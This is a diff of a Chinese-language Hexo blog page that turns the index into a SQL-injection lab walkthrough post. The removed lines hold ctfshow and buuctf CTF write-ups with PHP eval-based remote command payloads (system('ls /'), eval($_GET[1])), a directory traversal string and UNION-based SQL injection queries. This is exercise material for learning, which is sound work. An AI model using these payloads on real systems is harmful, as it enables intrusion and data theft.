@@ -20,28 +20,92 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/index.html">
+  <meta name="description" content="sql-lab全通关sql注入基本流程：  判断是否存在注入，注入是字符型还是数字型 猜解字段数 确定显示的字段顺序 获取当前数据库 爆数据库中的表 报表中的字段名   猜解字段数 试 1? id&#x3D;-1&amp;#x27; union select 1,2,3%23  爆数据库 1?id &#x3D; -1&amp;#x27; union select1,2,group_concat(schema_name) from i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql-lab全通关">
+<meta property="og:url" content="http://example.com/2023/07/29/sql-lab%E5%85%A8%E9%80%9A%E5%85%B3/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sql-lab全通关sql注入基本流程：  判断是否存在注入，注入是字符型还是数字型 猜解字段数 确定显示的字段顺序 获取当前数据库 爆数据库中的表 报表中的字段名   猜解字段数 试 1? id&#x3D;-1&amp;#x27; union select 1,2,3%23  爆数据库 1?id &#x3D; -1&amp;#x27; union select1,2,group_concat(schema_name) from i">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230307205850154.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230307205835798.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230307205658641.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230307210229540.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230307210617714.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309192905044.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309192928413.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309193011896.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309193310264.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309193739104.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309194100045.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309194154803.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309200722483.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309200756406.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309200909350.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309200939545.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309200958168.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309201454854.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309211838312.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309211744303.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309212019548.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309212212022.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230309212657995.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310123931247.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310124152729.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310201438889.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310220335231.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310220628585.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310221116218.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310221422607.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310222236322.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310223027399.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310223008881.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310225624359.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311091328276.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311092708372.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311092729640.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311092954869.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311093018409.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231157014.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231451024.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231638264.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231808641.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231817204.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310231948302.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310232138171.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310232257188.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310232827711.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311093221556.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311093600924.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311093535568.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230310234038736.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311000455246.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311001709085.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311001811540.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311001843390.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311002031510.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311002637553.png">
+<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230311003845733.png">
+<meta property="article:published_time" content="2023-07-29T06:15:49.000Z">
+<meta property="article:modified_time" content="2023-07-29T06:16:14.881Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230307205850154.png">
 
-<link rel="canonical" href="http://example.com/">
+<link rel="canonical" href="http://example.com/2023/07/29/sql-lab%E5%85%A8%E9%80%9A%E5%85%B3/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'en'
   };
 </script>
 
-  <title>Hexo</title>
+  <title>sql-lab全通关 | Hexo</title>
   
 
 
@@ -159,182 +223,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/29/ctfshow-web/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/29/ctfshow-web/" class="post-title-link" itemprop="url">ctfshow(web)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-07-29 15:25:16 / Modified: 16:32:21" itemprop="dateCreated datePublished" datetime="2023-07-29T15:25:16+08:00">2023-07-29</time>
-            </span>
-
-          
-
-        </div>
-      </header>
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="菜狗杯"><a href="#菜狗杯" class="headerlink" title="菜狗杯"></a>菜狗杯</h1><h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-11-10 17:20:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-11-11 09:38:59</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$_GET</span>[<span class="variable">$_POST</span>[<span class="variable">$_COOKIE</span>[<span class="string">&#x27;CTFshow-QQ群:&#x27;</span>]]]][<span class="number">6</span>][<span class="number">0</span>][<span class="number">7</span>][<span class="number">5</span>][<span class="number">8</span>][<span class="number">0</span>][<span class="number">9</span>][<span class="number">4</span>][<span class="number">4</span>]);</span><br></pre></td></tr></table></figure>
-
-
-
-<p>假如<code>cookie</code>传入<code>CTFshow-QQ群：=a</code> ,<code>$_POST[a]</code> ,令<code>a=b</code>,则<code>$_GET[b]</code>,令b&#x3D;c,则<code>$_REQUEST[c]</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_REQUEST[c][6][0][7][5][8][0][9][4][4]，其中$_REQUEST是以任何一种方式请求都可以，c为数组，$_REQUEST请求中传入的值是取的C数组中ID键为[6][0][7][5][8][0][9][4][4]的值。因为PHP数组是可以指定ID键分配值的，那么我们就可以给C数组中的这些键直接赋值：c[6][0][7][5][8][0][9][4][4]= system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p>注意 传入cookie值<code>群</code>要用URL编码</p>
-<p>pyload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cookie: CTFshow-QQ%E7%BE%A4:=a</span><br><span class="line">GET: ?b=c</span><br><span class="line">POST: a=b&amp;c[6][0][7][5][8][0][9][4][4]=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p>得到</p>
-<p><img src="F:\blog\public\images\image-20230729161126553.png" alt="image-20230729161126553"></p>
-<p>查看f1agaaa</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cookie: CTFshow-QQ%E7%BE%A4:=a</span><br><span class="line">GET: ?b=c</span><br><span class="line">POST: a=b&amp;c[6][0][7][5][8][0][9][4][4]=system(&#x27;cat /f1agaaa&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p>得到flag</p>
-<h2 id="web2-c0me-t0-s1gn"><a href="#web2-c0me-t0-s1gn" class="headerlink" title="web2 c0me_t0_s1gn"></a>web2 c0me_t0_s1gn</h2><p>查看源代码</p>
-<p><img src="F:\blog\public\images\image-20230729161351928.png" alt="image-20230729161351928"></p>
-<p>给出一般的flag，剩下的提示在控制台</p>
-<p><img src="F:\blog\public\images\image-20230729161420515.png" alt="image-20230729161420515"></p>
-<p>提示运行<code>g1ve_flag()</code></p>
-<p><img src="F:\blog\public\images\image-20230729161502774.png" alt="image-20230729161502774"></p>
-<p><code>ctfshow&#123;We1c0me_t0_jo1n_u3_!&#125;</code></p>
-<h2 id="我的眼里只有"><a href="#我的眼里只有" class="headerlink" title="我的眼里只有$"></a>我的眼里只有$</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-11-10 17:20:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-11-11 08:21:54</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="comment"># 将post上来的数据直接都解析成变量的形式，在代码中可以直接使用</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);</span><br><span class="line"><span class="comment">//变量嵌套</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
-
-
-
-<p>同样是个嵌套，原理同第一题，但是嵌套了35次，</p>
-<p>写脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">list</span> = string.ascii_letters</span><br><span class="line">payload = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;_=a&#x27;</span>,end=<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">34</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">list</span>[i]&#125;</span>=<span class="subst">&#123;<span class="built_in">list</span>[i+<span class="number">1</span>]&#125;</span>&#x27;</span>,end=<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> i=<span class="number">33</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">list</span>[i+<span class="number">1</span>]&#125;</span>=<span class="subst">&#123;payload&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=a&amp;a=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=n&amp;n=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=A&amp;A=B&amp;B=C&amp;C=D&amp;D=E&amp;E=F&amp;F=G&amp;G=H&amp;H=I&amp;I=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p><img src="F:\blog\public\images\image-20230729162920083.png" alt="image-20230729162920083"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=a&amp;a=b&amp;b=c&amp;c=d&amp;d=e&amp;e=f&amp;f=g&amp;g=h&amp;h=i&amp;i=j&amp;j=k&amp;k=l&amp;l=m&amp;m=n&amp;n=o&amp;o=p&amp;p=q&amp;q=r&amp;r=s&amp;s=t&amp;t=u&amp;u=v&amp;v=w&amp;w=x&amp;x=y&amp;y=z&amp;z=A&amp;A=B&amp;B=C&amp;C=D&amp;D=E&amp;E=F&amp;F=G&amp;G=H&amp;H=I&amp;I=system(&#x27;cat /f1agaaa&#x27;);</span><br></pre></td></tr></table></figure>
-
-
-
-<p>另外再贴一下官方的wp</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$<span class="built_in">str</span>=<span class="string">&quot;_=__&quot;</span>;</span><br><span class="line">$res=<span class="string">&quot;&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;_=__&amp;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">34</span>; $i++) &#123; </span><br><span class="line">        $<span class="built_in">str</span>=<span class="string">&quot;_&quot;</span>.$<span class="built_in">str</span>.<span class="string">&quot;_&quot;</span>;</span><br><span class="line">        echo $<span class="built_in">str</span>.<span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($i==<span class="number">33</span>)&#123;</span><br><span class="line">                echo explode(<span class="string">&quot;=&quot;</span>, $<span class="built_in">str</span>)[<span class="number">1</span>].<span class="string">&quot;=eval(\$_GET[1]);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=__&amp;__=___&amp;___=____&amp;____=_____&amp;_____=______&amp;______=_______&amp;_______=________&amp;________=_________&amp;_________=__________&amp;__________=___________&amp;___________=____________&amp;____________=_____________&amp;_____________=______________&amp;______________=_______________&amp;_______________=________________&amp;________________=_________________&amp;_________________=__________________&amp;__________________=___________________&amp;___________________=____________________&amp;____________________=_____________________&amp;_____________________=______________________&amp;______________________=_______________________&amp;_______________________=________________________&amp;________________________=_________________________&amp;_________________________=__________________________&amp;__________________________=___________________________&amp;___________________________=____________________________&amp;____________________________=_____________________________&amp;_____________________________=______________________________&amp;______________________________=_______________________________&amp;_______________________________=________________________________&amp;________________________________=_________________________________&amp;_________________________________=__________________________________&amp;__________________________________=___________________________________&amp;___________________________________=____________________________________&amp;____________________________________=eval($_GET[1]);</span><br></pre></td></tr></table></figure>
-
-<p>官方的话使用<code>_</code>而不是使用字母，</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/29/buuctf-web/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/29/buuctf-web/" class="post-title-link" itemprop="url">buuctf(web)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-07-29 15:20:07 / Modified: 15:58:20" itemprop="dateCreated datePublished" datetime="2023-07-29T15:20:07+08:00">2023-07-29</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="buuctf-web"><a href="#buuctf-web" class="headerlink" title="buuctf(web)"></a>buuctf(web)</h1><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p><img src="F:\blog\public\images\image-20230729153522620.png" alt="image-20230729153522620"></p>
-<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>查看页内源代码</p>
-<p><img src="F:\blog\public\images\image-20230729153638339.png" alt="image-20230729153638339"></p>
-<p>传参<code>?cat=dog</code></p>
-<p><code>       flag&#123;d244a78c-5ad2-48b1-a2db-8d6e98a8f3e6&#125;       </code></p>
-<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>查看源代码发现有</p>
-<p><code>source.php</code>其中有一个<code>hint.php</code></p>
-<p><img src="F:\blog\public\images\image-20230729155305303.png" alt="image-20230729155305303"></p>
-<p><code>?file=hint.php?../../../../../ffffllllaaaagggg</code></p>
-<p>进行目录遍历</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
@@ -350,10 +242,9 @@
       <meta itemprop="name" content="Hexo">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/29/sql-lab%E5%85%A8%E9%80%9A%E5%85%B3/" class="post-title-link" itemprop="url">sql-lab全通关</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          sql-lab全通关
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -377,7 +268,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="sql-lab全通关"><a href="#sql-lab全通关" class="headerlink" title="sql-lab全通关"></a>sql-lab全通关</h1><h2 id="sql注入基本流程："><a href="#sql注入基本流程：" class="headerlink" title="sql注入基本流程："></a>sql注入基本流程：</h2><blockquote>
+        <h1 id="sql-lab全通关"><a href="#sql-lab全通关" class="headerlink" title="sql-lab全通关"></a>sql-lab全通关</h1><h2 id="sql注入基本流程："><a href="#sql注入基本流程：" class="headerlink" title="sql注入基本流程："></a>sql注入基本流程：</h2><blockquote>
 <ol>
 <li>判断是否存在注入，注入是字符型还是数字型</li>
 <li>猜解字段数</li>
@@ -1198,741 +1089,33 @@
 [(2条消息) Sqlmap命令大全_风过留不留声的博客-CSDN博客](https://blog.csdn.net/phpppppppppp/article/details/124968358)
 </code></pre>
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/29/Java%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E4%B8%80/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/29/Java%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E4%B8%80/" class="post-title-link" itemprop="url">Java安全入门(一)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-07-29 12:10:47 / Modified: 12:23:39" itemprop="dateCreated datePublished" datetime="2023-07-29T12:10:47+08:00">2023-07-29</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Java安全入门（一）"><a href="#Java安全入门（一）" class="headerlink" title="Java安全入门（一）"></a>Java安全入门（一）</h1><p>我们学习php的时候，最核心的一步其实是命令执行，只有RCE成功，我们才算真正拿下了这台主机，所以，java这里，我们先学习一下命令执行。</p>
-<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span>&#123;</span><br><span class="line">    <span class="comment">//当前指令无回显</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        
 
 
-      
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/29/Java%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E4%B8%80/" rel="prev" title="Java安全入门(一)">
+      <i class="fa fa-chevron-left"></i> Java安全入门(一)
+    </a></div>
